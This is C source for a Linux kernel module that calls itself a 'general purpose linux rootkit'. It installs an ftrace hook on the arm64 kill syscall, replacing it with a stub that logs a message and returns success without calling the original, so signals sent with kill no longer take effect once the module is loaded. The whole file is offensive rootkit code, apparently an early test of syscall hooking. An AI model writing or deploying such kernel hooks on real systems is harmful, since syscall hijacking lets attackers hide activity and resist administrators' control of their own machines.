#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include "hook_v6.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("0xwillow");
MODULE_DESCRIPTION("general purpose linux rootkit");
MODULE_VERSION("1.0");

static notrace asmlinkage int (*orig_kill) (const struct pt_regs *);

asmlinkage notrace int hook_kill(const struct pt_regs *regs) {
    pr_info("debug: hooked kill :D\n");
    return 0;
    // return orig_kill(regs);
}

static struct ftrace_hook hook = {"__arm64_sys_kill", hook_kill, &orig_kill, 0, {NULL, NULL, NULL}};;

static int __init hook_test_mod_init(void) {
    int err;
    err = fh_install_hook(&hook);
    if (err) {
        pr_info("debug: fh_install_hook failed\n");
        return err;
    }
    pr_info("debug: module loaded\n");
    return 0;
}

static void __exit hook_test_mod_exit(void) {
    fh_remove_hook(&hook);
    pr_info("debug: module unloaded\n");
}


module_init(hook_test_mod_init);
module_exit(hook_test_mod_exit);
